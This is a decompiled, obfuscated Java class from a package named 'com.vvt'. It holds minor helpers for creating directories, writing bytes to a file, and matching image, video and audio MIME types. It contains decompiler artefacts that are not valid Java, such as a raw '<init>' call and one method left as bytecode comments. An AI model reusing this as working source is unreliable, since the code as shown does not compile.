package com.vvt.y;

import com.vvt.io.p;
import java.io.File;

public class a
{
  private static final boolean a = com.vvt.ak.a.e;
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    String str = p.a(paramString1, paramString3);
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (!bool) {
      localFile.mkdirs();
    }
    return p.a(str, paramString2);
  }
  
  /* Error */
  public static void a(byte[] paramArrayOfByte, String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: new 33	java/io/FileOutputStream
    //   7: astore 4
    //   9: aload 4
    //   11: aload_1
    //   12: invokespecial 34	java/io/FileOutputStream:<init>	(Ljava/lang/String;)V
    //   15: aload 4
    //   17: aload_0
    //   18: invokevirtual 38	java/io/FileOutputStream:write	([B)V
    //   21: aload 4
    //   23: invokestatic 43	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   26: return
    //   27: astore 4
    //   29: iconst_0
    //   30: istore 5
    //   32: aconst_null
    //   33: astore 4
    //   35: getstatic 13	com/vvt/y/a:a	Z
    //   38: istore_2
    //   39: iload_2
    //   40: ifeq -19 -> 21
    //   43: goto -22 -> 21
    //   46: astore 4
    //   48: getstatic 13	com/vvt/y/a:a	Z
    //   51: istore 5
    //   53: iload 5
    //   55: ifeq +3 -> 58
    //   58: aload_3
    //   59: invokestatic 43	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   62: goto -36 -> 26
    //   65: astore 4
    //   67: aload_3
    //   68: invokestatic 43	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   71: aload 4
    //   73: athrow
    //   74: astore 6
    //   76: aload 4
    //   78: astore_3
    //   79: aload 6
    //   81: astore 4
    //   83: goto -16 -> 67
    //   86: astore_3
    //   87: aload 4
    //   89: astore_3
    //   90: goto -42 -> 48
    //   93: astore_3
    //   94: goto -59 -> 35
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	97	0	paramArrayOfByte	byte[]
    //   0	97	1	paramString	String
    //   1	39	2	bool1	boolean
    //   3	76	3	localObject1	Object
    //   86	1	3	localIOException1	java.io.IOException
    //   89	1	3	localObject2	Object
    //   93	1	3	localFileNotFoundException1	java.io.FileNotFoundException
    //   7	15	4	localFileOutputStream	java.io.FileOutputStream
    //   27	1	4	localFileNotFoundException2	java.io.FileNotFoundException
    //   33	1	4	localObject3	Object
    //   46	1	4	localIOException2	java.io.IOException
    //   65	12	4	localObject4	Object
    //   81	7	4	localObject5	Object
    //   30	24	5	bool2	boolean
    //   74	6	6	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   4	7	27	java/io/FileNotFoundException
    //   11	15	27	java/io/FileNotFoundException
    //   4	7	46	java/io/IOException
    //   11	15	46	java/io/IOException
    //   4	7	65	finally
    //   11	15	65	finally
    //   48	51	65	finally
    //   17	21	74	finally
    //   35	38	74	finally
    //   17	21	86	java/io/IOException
    //   17	21	93	java/io/FileNotFoundException
  }
  
  public static boolean a(String paramString)
  {
    boolean bool1 = false;
    String str = "image/jpg";
    boolean bool2 = paramString.equalsIgnoreCase(str);
    if (!bool2)
    {
      str = "image/jpeg";
      bool2 = paramString.equalsIgnoreCase(str);
      if (!bool2)
      {
        str = "image/png";
        bool2 = paramString.equalsIgnoreCase(str);
        if (!bool2)
        {
          str = "image/gif";
          bool2 = paramString.equalsIgnoreCase(str);
          if (!bool2)
          {
            str = "image/bmp";
            bool2 = paramString.equalsIgnoreCase(str);
            if (!bool2) {
              return bool1;
            }
          }
        }
      }
    }
    bool1 = true;
    return bool1;
  }
  
  public static boolean b(String paramString)
  {
    String str;
    boolean bool;
    if (paramString != null)
    {
      str = "video/";
      bool = paramString.startsWith(str);
      if (bool) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      str = null;
    }
  }
  
  public static boolean c(String paramString)
  {
    String str;
    boolean bool;
    if (paramString != null)
    {
      str = "audio/";
      bool = paramString.startsWith(str);
      if (bool) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      str = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/y/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */